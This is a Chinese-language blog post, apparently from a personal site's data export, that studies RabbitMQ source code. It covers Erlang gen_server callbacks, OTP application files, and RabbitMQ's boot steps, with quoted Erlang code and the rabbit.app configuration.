第四个参数Options是一些选项，可以设置debug、超时等东西。 start对应的回调函数是init/1，一般来说是进行服务器启动后的一些初始化的工作， 并生成初始的状态State，正常返回是{ok, State}。这个State是贯穿整个服务器， 并把所有六个回调函数联系起来的纽带。它的值最初由init/1生成， 此后可以由三个handle函数修改，每次修改后又要放回返回值中， 供下一个被调用的handle函数使用。 如果init/1返回ignore或{stop, Reason}，则会中止服务器的启动。 有一点细节要注意的是，API函数和回调函数虽然习惯上是写在同一个文件中，但执行函数 的进程却通常是不一样的。在上面的模板中，start_link/0中使用self()的话，显示的是调用者的进程号，而在init/1中使用self()的话，显示的是服务器的进程号。 使用服务器 三个handle开头的回调函数对应着三种不同的使用服务器的方式。如下： 123gen_server:call ------------- handle_call&#x2F;3gen_server:cast ------------- handle_cast&#x2F;2用！向服务进程发消息 ------------- handle_info&#x2F;2 call是有返回值的调用；cast是无返回值的调用，即通知；而直接向服务器进程发的 消息则由handle_info处理。 call是有返回值的调用，也是所谓的同步调用，进程会在调用后一直等待直到回调函数返回为止。 它的函数形式是 gen_server:call(ServerRef, Request, Timeout) -&gt; Reply， 第一个参数ServerRef是被调用的服务器，可以是服务器名，或是服务器的pid。 第二个参数Request会直接传给回调函数handle_call。 最后一个参数Timeout是超时，是可以省略的，默认值是5秒。 call是用来指挥回调函数handle_call/3干活的。具体形式为 handle_call(Request, From, State)。 第一个参数Request是由call传进来的，是写程序时关注和处理的重点。 第二个参数From是gen_server传进来的，是调用的来源，也就是哪个进程执行了call。 From的形式是{Pid, Ref}，Pid是来源进程号，而Ref是调用的标识，每一次调用 都不一样，用以区别。有了Pid，在需要向来源进程发送消息时就可以使用，但由于call 是有返回值的，一般使用返回值传递数据就好。 第三个参数State是服务器的状态，这是由init或是其他的handle函数生成的，可以根据需要进 行修改之后，再放回返回值中。 call call对应的回调函数handle_call/3在正常情况下的返回值是{reply, Reply, NewState}， Reply会作为call的返回值传递回去，NewState则会作为服务器的状态。 另外还可以使用{stop, Reason, State}中止服务器运行，这比较少用。 使用call要小心的是，两个服务器进程不能互相call，不然会死锁。 castcast是没有返回值的调用，一般把它叫做通知。它是一个“异步”的调用，调用后会直接收到 ok，无需等待回调函数执行完毕。 它的形式是gen_server:cast(ServerRef, Request)。参数含义 与call相同。由于不需要等待返回，所以没必要设置超时，没有第三个参数。 在多节点的情况下，可以用abcast，向各节点上的具有指定名字的服务进程发通知。 cast们对应的回调函数是handle_cast/2，具体为：handle_cast(Msg, State)。 第一个参数是由cast传进去的，第二个是服务器状态，和call类似，不多说。 handel_cast/2的返回值通常是{noreply, NewState}，这可以用来改变服务器状态， 或是{stop, Reason, NewState}，这会停止服务器。通常来说，停止服务器的命令用 cast来实现比较多。 停止服务器 上面介绍的handle函数返回{stop,…}，就会使用回调函数terminate/2进行扫尾工作。 典型的如关闭已打开的资源、文件、网络连接，打log做记录，通知别的进程“我要死啦”， 或是“信春哥，满血复活”：利用传进来的状态State重新启动服务器。 原生消息原生消息使用handle_info/2处理，具体为handle_info(Info, State)。其中Info是 发过来的消息的内容。回复和handle_cast是一样的。 saslsasl 是系统架构支持库(System Architecture Support Libraries，简称SASL)，负责记录错误记录和过载保护。 erlang应用都会启动一个sasl应用，sasl的一个重要功能便是可以记录系统进程相关日志，如进程启动、结束、崩溃错误等信息。sasl的日志功能是基于erlang自带的日志模块error_logger来实现的，sasl中定义了下面3个错误处理： sasl_report_tty_h:将日志输出到控制台 sasl_report_file_h:将日志输出到单个文件 error_logger_mf_h:循环日志文件记录 cowboycowboy 是一个小型的快速模块的HTTP服务器。它使用Erlang编写的。https://github.com/ninenines/cowboy rabbit主流程rabbit application 模块启动过程： 有点多。。。todo… rabbit按照有向无环图方式一步步启动: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182%% 按照有向图的拓扑排序启动进程%% pre_boot-rabbit_boot_step(&#123;pre_boot, [&#123;description, \"rabbit boot start\"&#125;]&#125;).%% codec_correctness_check-rabbit_boot_step(&#123;codec_correctness_check, [&#123;description, \"codec correctness check\"&#125;, &#123;mfa, &#123;rabbit_binary_generator, check_empty_frame_size, []&#125;&#125;, &#123;requires, pre_boot&#125;, &#123;enables, external_infrastructure&#125;]&#125;).%% rabbit_alarm currently starts memory and disk space monitors%% rabbit_alarm-rabbit_boot_step(&#123;rabbit_alarm, [&#123;description, \"alarm handler\"&#125;, &#123;mfa, &#123;rabbit_alarm, start, []&#125;&#125;, &#123;requires, pre_boot&#125;, &#123;enables, external_infrastructure&#125;]&#125;).%% database-rabbit_boot_step(&#123;database, [&#123;mfa, &#123;rabbit_mnesia, init, []&#125;&#125;, &#123;requires, file_handle_cache&#125;, &#123;enables, external_infrastructure&#125;]&#125;).%% database_sync-rabbit_boot_step(&#123;database_sync, [&#123;description, \"database sync\"&#125;, &#123;mfa, &#123;rabbit_sup, start_child, [mnesia_sync]&#125;&#125;, &#123;requires, database&#125;, &#123;enables, external_infrastructure&#125;]&#125;).%% file_handle_cache-rabbit_boot_step(&#123;file_handle_cache, [&#123;description, \"file handle cache server\"&#125;, &#123;mfa, &#123;rabbit, start_fhc, []&#125;&#125;, %% FHC needs memory monitor to be running &#123;requires, rabbit_alarm&#125;, &#123;enables, worker_pool&#125;]&#125;).%% worker_pool-rabbit_boot_step(&#123;worker_pool, [&#123;description, \"worker pool\"&#125;, &#123;mfa, &#123;rabbit_sup, start_supervisor_child, [worker_pool_sup]&#125;&#125;, &#123;requires, pre_boot&#125;, &#123;enables, external_infrastructure&#125;]&#125;).%% external_infrastructure-rabbit_boot_step(&#123;external_infrastructure, [&#123;description, \"external infrastructure ready\"&#125;]&#125;).%% rabbit_registry-rabbit_boot_step(&#123;rabbit_registry, [&#123;description, \"plugin registry\"&#125;, &#123;mfa, &#123;rabbit_sup, start_child, [rabbit_registry]&#125;&#125;, &#123;requires, external_infrastructure&#125;, &#123;enables, kernel_ready&#125;]&#125;).%% rabbit_event-rabbit_boot_step(&#123;rabbit_event, [&#123;description, \"statistics event manager\"&#125;, &#123;mfa, &#123;rabbit_sup, start_restartable_child, [rabbit_event]&#125;&#125;, &#123;requires, external_infrastructure&#125;, &#123;enables, kernel_ready&#125;]&#125;).%% kernel_ready-rabbit_boot_step(&#123;kernel_ready, [&#123;description, \"kernel ready\"&#125;, &#123;requires, external_infrastructure&#125;]&#125;).%% rabbit_memory_monitor-rabbit_boot_step(&#123;rabbit_memory_monitor, [&#123;description, \"memory monitor\"&#125;, &#123;mfa, &#123;rabbit_sup, start_restartable_child, [rabbit_memory_monitor]&#125;&#125;, &#123;requires, rabbit_alarm&#125;, &#123;enables, core_initialized&#125;]&#125;).%% guid_generator-rabbit_boot_step(&#123;guid_generator, [&#123;description, \"guid generator\"&#125;, &#123;mfa, &#123;rabbit_sup, start_restartable_child, [rabbit_guid]&#125;&#125;, &#123;requires, kernel_ready&#125;, &#123;enables, core_initialized&#125;]&#125;).%% delegate_sup-rabbit_boot_step(&#123;delegate_sup, [&#123;description, \"cluster delegate\"&#125;, &#123;mfa, &#123;rabbit, boot_delegate, []&#125;&#125;, &#123;requires, kernel_ready&#125;, &#123;enables, core_initialized&#125;]&#125;).%% rabbit_node_monitor-rabbit_boot_step(&#123;rabbit_node_monitor, [&#123;description, \"node monitor\"&#125;, &#123;mfa, &#123;rabbit_sup, start_restartable_child, [rabbit_node_monitor]&#125;&#125;, &#123;requires, [rabbit_alarm, guid_generator]&#125;, &#123;enables, core_initialized&#125;]&#125;).%% rabbit_epmd_monitor-rabbit_boot_step(&#123;rabbit_epmd_monitor, [&#123;description, \"epmd monitor\"&#125;, &#123;mfa, &#123;rabbit_sup, start_restartable_child, [rabbit_epmd_monitor]&#125;&#125;, &#123;requires, kernel_ready&#125;, &#123;enables, core_initialized&#125;]&#125;).%% core_initialized-rabbit_boot_step(&#123;core_initialized, [&#123;description, \"core initialized\"&#125;, &#123;requires, kernel_ready&#125;]&#125;).%% empty_db_check-rabbit_boot_step(&#123;empty_db_check, [&#123;description, \"empty DB check\"&#125;, &#123;mfa, &#123;?MODULE, maybe_insert_default_data, []&#125;&#125;, &#123;requires, core_initialized&#125;, &#123;enables, routing_ready&#125;]&#125;).%% recovery-rabbit_boot_step(&#123;recovery, [&#123;description, \"exchange, queue and binding recovery\"&#125;, &#123;mfa, &#123;rabbit, recover, []&#125;&#125;, &#123;requires, core_initialized&#125;, &#123;enables, routing_ready&#125;]&#125;).%% mirrored_queues-rabbit_boot_step(&#123;mirrored_queues, [&#123;description, \"adding mirrors to queues\"&#125;, &#123;mfa, &#123;rabbit_mirror_queue_misc, on_node_up, []&#125;&#125;, &#123;requires, recovery&#125;, &#123;enables, routing_ready&#125;]&#125;).%% routing_ready-rabbit_boot_step(&#123;routing_ready, [&#123;description, \"message delivery logic ready\"&#125;, &#123;requires, core_initialized&#125;]&#125;).%% log_relay-rabbit_boot_step(&#123;log_relay, [&#123;description, \"error log relay\"&#125;, &#123;mfa, &#123;rabbit_sup, start_child, [rabbit_error_logger_lifecycle, supervised_lifecycle, [rabbit_error_logger_lifecycle, &#123;rabbit_error_logger, start, []&#125;, &#123;rabbit_error_logger, stop, []&#125;]]&#125;&#125;, &#123;requires, routing_ready&#125;, &#123;enables, networking&#125;]&#125;).%% direct_client-rabbit_boot_step(&#123;direct_client, [&#123;description, \"direct client\"&#125;, &#123;mfa, &#123;rabbit_direct, boot, []&#125;&#125;, &#123;requires, log_relay&#125;]&#125;).%% networking-rabbit_boot_step(&#123;networking, [&#123;mfa, &#123;rabbit_networking, boot, []&#125;&#125;, &#123;requires, log_relay&#125;]&#125;).%% notify_cluster-rabbit_boot_step(&#123;notify_cluster, [&#123;description, \"notify cluster nodes\"&#125;, &#123;mfa, &#123;rabbit_node_monitor, notify_node_up, []&#125;&#125;, &#123;requires, networking&#125;]&#125;).%% background_gc-rabbit_boot_step(&#123;background_gc, [&#123;description, \"background garbage collection\"&#125;, &#123;mfa, &#123;rabbit_sup, start_restartable_child, [background_gc]&#125;&#125;, &#123;enables, networking&#125;]&#125;).%%--------------------------------------------------------------------------- 一个个看过去。。。 codec_correctness_check： 执行rabbit_binary_generator:check_empty_frame_size()函数 123456789%% 检查空的Frame数据的正确性check_empty_frame_size() -&gt; %% Intended to ensure that EMPTY_FRAME_SIZE is defined correctly. %% 旨在确保EMPTY_FRAME_SIZE正确定义 case iolist_size(create_frame(?FRAME_BODY, 0, &lt;&lt;&gt;&gt;)) of ?EMPTY_FRAME_SIZE -&gt; ok; ComputedSize -&gt; exit(&#123;incorrect_empty_frame_size, ComputedSize, ?EMPTY_FRAME_SIZE&#125;) end. rabbit_alarm启动: 123%% rabbit_alarm进程启动的入口(RabbitMQ App应用启动的时候第一个执行的接口)start_link() -&gt; gen_event:start_link(&#123;local, ?SERVER&#125;). start函数 1234567891011121314151617181920212223start() -&gt; %% 启动rabbit_alarm_sup监督进程以及在该监督进程下启动rabbit_alarm进程 ok = rabbit_sup:start_restartable_child(?MODULE), %% 启动rabbit_alarm对应于rabbit_alarm事件服务器进程的事件处理进程 ok = gen_event:add_handler(?SERVER, ?MODULE, []), %% 启动vm_memory_monitor_sup监督进程以及在该监督进程下启动vm_memory_monitor进程(虚拟机内存监控进程) &#123;ok, MemoryWatermark&#125; = application:get_env(vm_memory_high_watermark), rabbit_sup:start_restartable_child( vm_memory_monitor, [MemoryWatermark, fun (Alarm) -&gt; %% 对当前RabbitMQ系统进行一次垃圾回收 background_gc:run(), %% 设置报警器的函数 set_alarm(Alarm) end, %% 清除报警器的函数 fun clear_alarm/1]), %% 启动rabbit_disk_monitor_sup监督进程以及在该监督进程下启动rabbit_disk_monitor进程(硬盘使用监控进程) &#123;ok, DiskLimit&#125; = application:get_env(disk_free_limit), rabbit_sup:start_delayed_restartable_child( rabbit_disk_monitor, [DiskLimit]), ok. database启动： 123456789101112131415161718192021%%----------------------------------------------------------------------------%% Main interface(接口)%%----------------------------------------------------------------------------%% RabbitMQ系统mnesia database启动步骤中执行的函数init() -&gt; %% 确保mnesia数据库的启动 ensure_mnesia_running(), %% 确保mnesia数据库保存目录的存在 ensure_mnesia_dir(), %% 判断当前节点是否是新启动的节点 case is_virgin_node() of true -&gt; init_from_config(); false -&gt; NodeType = node_type(), init_db_and_upgrade(cluster_nodes(all), NodeType, NodeType =:= ram) end, %% We intuitively(直观地) expect the global name server to be synced when %% Mnesia is up. In fact that's not guaranteed(保证) to be the case - %% let's make it so. ok = rabbit_node_monitor:global_sync(), ok. TO be continue … 参考资料https://wudaijun.com/2015/04/erlang-mnesia/ https://www.cnblogs.com/hzy1987/p/5441807.html https://blog.csdn.net/zhangzhizhen1988/article/details/7932449 http://ninenines.eu/docs/en/cowboy/HEAD/guide/getting_started/ https://github.com/ninenines/cowboy","categories":[{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://www.yorzorzy.xyz/categories/rabbitmq/"}],"tags":[{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://www.yorzorzy.xyz/tags/rabbitmq/"}]},{"title":"rabbitmq源码学习一","slug":"rabbitmq源码学习","date":"2020-11-17T09:08:14.307Z","updated":"2020-11-17T09:06:24.000Z","comments":true,"path":"2020/11/17/rabbitmq源码学习/","link":"","permalink":"http://www.yorzorzy.xyz/2020/11/17/rabbitmq%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"rabbitmq源码学习一erlang介绍Erlang是具有多重范型的编程语言，具有很多特点，主要的特点有以下几个： 函数式 并发性 分布式 健壮性 软实时 热更新 递增式代码加载 动态类型 解释型 Erlang是函数式编程语言，函数式是一种编程模型，将计算机中的运算看做是数学中的函数计算，可以避免状态以及变量的概念。 对象是面向对象的第一型，函数式编程语言也是一样，函数是函数式编程的第一型。函数是Erlang编程语言的基本单位，在Erlang里，函数是第一型，函数几乎会被用作一切，包括最简单的计算。所有的概念都是由函数表达，所有额操作也都是由函数操作。 Applicationerlang application构成： 一个应用需要一个.app文件来描述，主要描述它包括哪些文件，参数等。 通过application，可以把一个功能模块打包成一个应用，让该模块可以单独start或者stop并且可以在其他模块中引 用。像mnesia那样。实现步骤： 1.首先完成要打包的功能模块，并且记得定义为application —&gt; 文件头加上 -behaviour(application). 2.为此模块添加.app应用资源文件，格式如下： 1&#123;application, Application, [Opt1,...,OptN]&#125;. 注意：Application 是一个代表应用的名称的原子。文件必须被命名成 Application.app 。 每一个Otp 都是一个定义了应用某种特性的元组 {Key, Value} 。所有的键都是可选。忽略的键会使用默认的值。 这些属性就是为了让erlang编译器知道该以哪种方式去启动此应用。 ch_app.app文件如下： 12345678&#123;application, ch_app,[&#123;description, \"Channel allocator\"&#125;,&#123;vsn, \"1\"&#125;,&#123;modules, [ch_app, ch_sup, ch3]&#125;,&#123;registered, [ch3]&#125;,&#123;applications, [kernel, stdlib, sasl]&#125;,&#123;mod, &#123;ch_app,[]&#125;&#125;]&#125;. description简短描述，字符串。默认为“”。vsn版本号，字符串。默认为”“。modules由该应用引入的所有模块。当生成启动脚本和tar文件时， systools 将用到这个列表。一个模块必须被定义于且仅于一个应用。默认为[]registered 应用中所有注册进程的名称。systools 使用这个列表来探测在应用之间是否有名称冲突。默认为 []。 applications 所有在此应用之前必须启动的应用。systools 使用该列表来生成正确的启动脚本。默认为 []，但是注意任何应用 都要至少依赖于kernel 和 stdlib 优势： 当我们把一个项目中所有的supervision tree通过一个简单的函数game: start(),会发现这个树结构特别复杂，只能有一个根节点，然后一直扩展。 那么有时，我们会需要：有些功能模块不启动，有些启动，如果再去改这颗树的结构，就会很麻烦。这里，这就是application出现的原因，设计一个可以随时开关的子块（application).比如：上图中的log app, db app ,game app, connect app .. 总体机制rabbitmq启动通过beam.smp来启动，正在的代码程序控制在plugins目录中，通过erlang来启动ez包程序。主进程程序在rabbit.ez文件中。可以通过解压文件查看内部的代码逻辑。 解压之后： rabbitmq使用erlang的application的结构，通过rabbit.app文件中的结构信息来启动服务。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118&#123;application, 'rabbit', [ &#123;description, \"RabbitMQ\"&#125;, &#123;vsn, \"3.8.9\"&#125;, &#123;id, \"v3.8.8-2-g5cf3d07\"&#125;, &#123;modules, ['amqqueue','amqqueue_v1','background_gc','code_server_cache','gatherer','gm','lager_exchange_backend','lqueue','mirrored_supervisor_sups','pg_local','rabbit','rabbit_access_control','rabbit_alarm','rabbit_amqqueue','rabbit_amqqueue_process','rabbit_amqqueue_sup','rabbit_amqqueue_sup_sup','rabbit_auth_backend_internal','rabbit_auth_mechanism_amqplain','rabbit_auth_mechanism_cr_demo','rabbit_auth_mechanism_plain','rabbit_autoheal','rabbit_backing_queue','rabbit_basic','rabbit_binding','rabbit_boot_steps','rabbit_channel','rabbit_channel_interceptor','rabbit_channel_sup','rabbit_channel_sup_sup','rabbit_client_sup','rabbit_config','rabbit_connection_helper_sup','rabbit_connection_sup','rabbit_connection_tracking','rabbit_connection_tracking_handler','rabbit_control_pbe','rabbit_core_ff','rabbit_core_metrics_gc','rabbit_credential_validation','rabbit_credential_validator','rabbit_credential_validator_accept_everything','rabbit_credential_validator_min_password_length','rabbit_credential_validator_password_regexp','rabbit_dead_letter','rabbit_definitions','rabbit_diagnostics','rabbit_direct','rabbit_disk_monitor','rabbit_epmd_monitor','rabbit_event_consumer','rabbit_exchange','rabbit_exchange_decorator','rabbit_exchange_parameters','rabbit_exchange_type_direct','rabbit_exchange_type_fanout','rabbit_exchange_type_headers','rabbit_exchange_type_invalid','rabbit_exchange_type_topic','rabbit_feature_flags','rabbit_ff_extra','rabbit_ff_registry','rabbit_fhc_helpers','rabbit_fifo','rabbit_fifo_client','rabbit_fifo_index','rabbit_file','rabbit_framing','rabbit_guid','rabbit_health_check','rabbit_lager','rabbit_limiter','rabbit_log_tail','rabbit_looking_glass','rabbit_maintenance','rabbit_memory_monitor','rabbit_metrics','rabbit_mirror_queue_coordinator','rabbit_mirror_queue_master','rabbit_mirror_queue_misc','rabbit_mirror_queue_mode','rabbit_mirror_queue_mode_all','rabbit_mirror_queue_mode_exactly','rabbit_mirror_queue_mode_nodes','rabbit_mirror_queue_slave','rabbit_mirror_queue_sync','rabbit_mnesia','rabbit_mnesia_rename','rabbit_msg_file','rabbit_msg_store','rabbit_msg_store_ets_index','rabbit_msg_store_gc','rabbit_networking','rabbit_node_monitor','rabbit_nodes','rabbit_parameter_validation','rabbit_password','rabbit_password_hashing_md5','rabbit_password_hashing_sha256','rabbit_password_hashing_sha512','rabbit_peer_discovery','rabbit_peer_discovery_classic_config','rabbit_peer_discovery_dns','rabbit_plugins','rabbit_policies','rabbit_policy','rabbit_policy_merge_strategy','rabbit_prelaunch_cluster','rabbit_prelaunch_enabled_plugins_file','rabbit_prelaunch_feature_flags','rabbit_prelaunch_logging','rabbit_prequeue','rabbit_priority_queue','rabbit_queue_consumers','rabbit_queue_decorator','rabbit_queue_index','rabbit_queue_location_client_local','rabbit_queue_location_min_masters','rabbit_queue_location_random','rabbit_queue_location_validator','rabbit_queue_master_location_misc','rabbit_queue_master_locator','rabbit_quorum_memory_manager','rabbit_quorum_queue','rabbit_reader','rabbit_recovery_terms','rabbit_restartable_sup','rabbit_router','rabbit_runtime_parameters','rabbit_ssl','rabbit_sup','rabbit_sysmon_handler','rabbit_sysmon_minder','rabbit_table','rabbit_trace','rabbit_upgrade','rabbit_upgrade_functions','rabbit_upgrade_preparation','rabbit_variable_queue','rabbit_version','rabbit_vhost','rabbit_vhost_limit','rabbit_vhost_msg_store','rabbit_vhost_process','rabbit_vhost_sup','rabbit_vhost_sup_sup','rabbit_vhost_sup_wrapper','rabbit_vm','supervised_lifecycle','tcp_listener','tcp_listener_sup','term_to_binary_compat','unconfirmed_messages','vhost','vhost_v1']&#125;, &#123;registered, [rabbit_sup,rabbit_amqqueue_sup,rabbit_direct_client_sup,rabbit_log,rabbit_node_monitor,rabbit_router]&#125;, &#123;applications, [kernel,stdlib,sasl,rabbitmq_prelaunch,os_mon,inets,compiler,public_key,crypto,ssl,syntax_tools,xmerl,cuttlefish,ranch,lager,rabbit_common,ra,sysmon_handler,stdout_formatter,recon,observer_cli]&#125;, &#123;mod, &#123;rabbit, []&#125;&#125;, &#123;env, [ &#123;tcp_listeners, [5672]&#125;, &#123;num_tcp_acceptors, 10&#125;, &#123;ssl_listeners, []&#125;, &#123;num_ssl_acceptors, 10&#125;, &#123;ssl_options, []&#125;, &#123;vm_memory_high_watermark, 0.4&#125;, &#123;vm_memory_high_watermark_paging_ratio, 0.5&#125;, &#123;vm_memory_calculation_strategy, rss&#125;, &#123;memory_monitor_interval, 2500&#125;, &#123;disk_free_limit, 50000000&#125;, %% 50MB &#123;msg_store_index_module, rabbit_msg_store_ets_index&#125;, &#123;backing_queue_module, rabbit_variable_queue&#125;, %% 0 (\"no limit\") would make a better default, but that %% breaks the QPid Java client &#123;frame_max, 131072&#125;, %% see rabbitmq-server#1593 &#123;channel_max, 2047&#125;, &#123;connection_max, infinity&#125;, &#123;heartbeat, 60&#125;, &#123;msg_store_file_size_limit, 16777216&#125;, &#123;msg_store_shutdown_timeout, 600000&#125;, &#123;fhc_write_buffering, true&#125;, &#123;fhc_read_buffering, false&#125;, &#123;queue_index_max_journal_entries, 32768&#125;, &#123;queue_index_embed_msgs_below, 4096&#125;, &#123;default_user, &lt;&lt;\"guest\"&gt;&gt;&#125;, &#123;default_pass, &lt;&lt;\"guest\"&gt;&gt;&#125;, &#123;default_user_tags, [administrator]&#125;, &#123;default_vhost, &lt;&lt;\"/\"&gt;&gt;&#125;, &#123;default_permissions, [&lt;&lt;\".*\"&gt;&gt;, &lt;&lt;\".*\"&gt;&gt;, &lt;&lt;\".*\"&gt;&gt;]&#125;, &#123;loopback_users, [&lt;&lt;\"guest\"&gt;&gt;]&#125;, &#123;password_hashing_module, rabbit_password_hashing_sha256&#125;, &#123;server_properties, []&#125;, &#123;collect_statistics, none&#125;, &#123;collect_statistics_interval, 5000&#125;, &#123;mnesia_table_loading_retry_timeout, 30000&#125;, &#123;mnesia_table_loading_retry_limit, 10&#125;, &#123;auth_mechanisms, ['PLAIN', 'AMQPLAIN']&#125;, &#123;auth_backends, [rabbit_auth_backend_internal]&#125;, &#123;delegate_count, 16&#125;, &#123;trace_vhosts, []&#125;, &#123;ssl_cert_login_from, distinguished_name&#125;, &#123;ssl_handshake_timeout, 5000&#125;, &#123;ssl_allow_poodle_attack, false&#125;, &#123;handshake_timeout, 10000&#125;, &#123;reverse_dns_lookups, false&#125;, &#123;cluster_partition_handling, ignore&#125;, &#123;cluster_keepalive_interval, 10000&#125;, &#123;autoheal_state_transition_timeout, 60000&#125;, &#123;tcp_listen_options, [&#123;backlog, 128&#125;, &#123;nodelay, true&#125;, &#123;linger, &#123;true, 0&#125;&#125;, &#123;exit_on_close, false&#125; ]&#125;, &#123;halt_on_upgrade_failure, true&#125;, &#123;ssl_apps, [asn1, crypto, public_key, ssl]&#125;, %% see rabbitmq-server#114 &#123;mirroring_flow_control, true&#125;, &#123;mirroring_sync_batch_size, 4096&#125;, %% see rabbitmq-server#227 and related tickets. %% msg_store_credit_disc_bound only takes effect when %% messages are persisted to the message store. If messages %% are embedded on the queue index, then modifying this %% setting has no effect because credit_flow is not used when %% writing to the queue index. See the setting %% queue_index_embed_msgs_below above. &#123;msg_store_credit_disc_bound, &#123;4000, 800&#125;&#125;, &#123;msg_store_io_batch_size, 4096&#125;, %% see rabbitmq-server#143, %% rabbitmq-server#949, rabbitmq-server#1098 &#123;credit_flow_default_credit, &#123;400, 200&#125;&#125;, &#123;quorum_commands_soft_limit, 32&#125;, &#123;quorum_cluster_size, 5&#125;, %% see rabbitmq-server#248 %% and rabbitmq-server#667 &#123;channel_operation_timeout, 15000&#125;, %% see rabbitmq-server#486 &#123;autocluster, [&#123;peer_discovery_backend, rabbit_peer_discovery_classic_config&#125;] &#125;, %% used by rabbit_peer_discovery_classic_config &#123;cluster_nodes, &#123;[], disc&#125;&#125;, &#123;config_entry_decoder, [&#123;passphrase, undefined&#125;]&#125;, %% rabbitmq-server#973 &#123;queue_explicit_gc_run_operation_threshold, 1000&#125;, &#123;lazy_queue_explicit_gc_run_operation_threshold, 1000&#125;, &#123;background_gc_enabled, false&#125;, &#123;background_gc_target_interval, 60000&#125;, %% rabbitmq-server#589 &#123;proxy_protocol, false&#125;, &#123;disk_monitor_failure_retries, 10&#125;, &#123;disk_monitor_failure_retry_interval, 120000&#125;, %% either \"stop_node\" or \"continue\". %% by default we choose to not terminate the entire node if one %% vhost had to shut down, see server#1158 and server#1280 &#123;vhost_restart_strategy, continue&#125;, %% &#123;global, prefetch count&#125; &#123;default_consumer_prefetch, &#123;false, 0&#125;&#125;, %% interval at which the channel can perform periodic actions &#123;channel_tick_interval, 60000&#125;, %% Default max message size is 128 MB &#123;max_message_size, 134217728&#125;, %% Socket writer will run GC every 1 GB of outgoing data &#123;writer_gc_threshold, 1000000000&#125; ]&#125;]&#125;. 解析该文件，构建有向无环图，然后按照有向无环图的方式来调用函数启动服务进程。 启动过程： 1.rabbit_alarm启动步骤(先执行rabbit_alarm:start()函数) ​ (1).启动一个rabbit_alarm_sup的supervisor2监督进程同时在该监督进程下启动一个rabbit_alarm的gen_event进程 ​ rabbit_alarm进程作为整个RabbitMQ系统的报警进程，例如内存，磁盘大小的报警，报警后，如果有人向rabbit_alarm进程注册， ​ 则会进程回调，同时会通知集群中的额其他节点 ​ (2).启动一个vm_memory_monitor_sup的supervisor2监督进程同时在该进程下启动一个vm_memory_monitor进程 ​ RabbitMQ系统虚拟机内存监督报警进程，如果虚拟机中的内存少于配置文件配置的大小，则会立刻通知rabbit_alarm进程 ​ 该进程就是RabbitMQ系统对内存使用情况监视的进程，如果当前内存使用量超过了配置文件中配置的大小，则会立刻向rabbit_alarm ​ 进程发布内存使用量过大的报警信息，则集群中的所有节点的rabbit_alarm进程则会将内存报警信息回调注册到rabbit_alarm进程的函数 ​ (3).启动一个rabbit_disk_monitor_sup的supervisor2监督进程同时在该监督进程下启动一个rabbit_disk_monitor进程 ​ RabbitMQ系统磁盘使用报警进程，如果磁盘剩余大小少于配置文件中配置的大小，则会立刻通知rabbit_alarm进程 ​ 该进程就是RabbitMQ系统对磁盘使用情况监视的进程，如果磁盘剩余量少于配置文件中配置的大小，则会立刻向rabbit_alarm进程 ​ 发布报警信息，则集群中的所有节点的rabbit_alarm进程都会将报警信息回调注册到rabbit_alarm进程的函数 2.file_handle_cache启动步骤 ​ (1).执行rabbit:start_fhc()函数启动file_handle_cache进程(该进程是RabbitMQ系统文件打开关闭操作关键进程) ​ 该进程是RabbitMQ系统所有操作磁盘文件相关操作的进程 3.worker_pool启动步骤(RabbitMQ系统异步执行任务的小系统) ​ (1).首先启动一个worker_pool_sup的supervisor的监督进程 ​ (2).worker_pool_sup监督进程下再启动一个worker_pool的进程池管理进程 ​ (3).worker_pool_sup监督进程下再启动调度线程个数的worker_pool_worker的工作进程 ​ 该监督树下的进程是用来异步提交函数让工作进程执行完成，worker_pool_worker为工作进程，worker_pool为所有worker_pool_worker进程的管理者，哪个 ​ worker_pool_worker进程空闲，哪个worker_pool_worker正在工作，worker_pool进程都有记录 4.database启动步骤(初始化RabbitMQ中的mnesia数据库，如果配置有集群数据库，自动连接到集群数据库) ​ (1).执行rabbit_mnesia:init()函数 ​ 该操作步骤是启动当前RabbitMQ节点的Mnesia数据库，同时将本节点同集群中的其他节点连接起来，并将集群中的数据同自己本地的数据进行同步，然后将 ​ RabbitMQ系统所有的数据库表启动起来 5.database_sync启动步骤 ​ (1).执行rabbit_sup:start_child(mnesia_sync)函数 ​ mnesia:sync_transaction操作没有保证Mnesia数据库的日志同步到磁盘上，则调用mnesia_sync:sync()函数的进程进行同步阻塞等待mnesia成功的将数据库 ​ 操作日志写入磁盘上 6.codec_correctness_check启动步骤 ​ (1).执行rabbit_binary_generator:check_empty_frame_size()函数 ​ 确保空的Frame数据格式的正确性 7.rabbit_registry启动步骤 ​ (1).执行rabbit_sup:start_child(rabbit_registry)函数 ​ RabbitMQ系统内部各种定义类型注册处理模块的进程，该进程启动了rabbit_registry名字的一个ETS表，用来存储分类，类型名字，以及处理模块的数据 8.rabbit_auth_mechanism_cr_demo启动步骤 ​ (1).执行rabbit_registry:register(auth_mechanism, &lt;&lt;”RABBIT-CR-DEMO”&gt;&gt;, rabbit_auth_mechanism_cr_demo)函数 ​ RabbitMQ系统用户验证处理模块之一 9.rabbit_auth_mechanism_amqplain启动步骤 ​ (1).执行rabbit_registry:register(auth_mechanism, &lt;&lt;”AMQPLAIN”&gt;&gt;, rabbit_auth_mechanism_amqplain)函数 ​ RabbitMQ系统用户验证处理模块之一 10.rabbit_auth_mechanism_plain启动步骤 ​ (1).执行rabbit_registry:register(auth_mechanism, &lt;&lt;”PLAIN”&gt;&gt;, rabbit_auth_mechanism_plain)函数 ​ RabbitMQ系统用户验证处理模块之一 11.rabbit_mirror_queue_mode_all启动步骤(高可用队列相关) ​ (1).执行rabbit_registry:register(ha_mode, &lt;&lt;”all”&gt;&gt;, rabbit_mirror_queue_mode_all)函数 12.rabbit_event启动步骤(RabbitMQ系统事件管理器进程) ​ (1).执行rabbit_sup:start_restartable_child(rabbit_event)函数,启动rabbit_event进程 ​ RabbitMQ系统中所有的事件都是发布到rabbit_event事件管理器中，只要有rabbit_event事件管理器的事件处理进程，则该进程就能接收到所有的事件 13.rabbit_exchange_tye_direct启动步骤 ​ 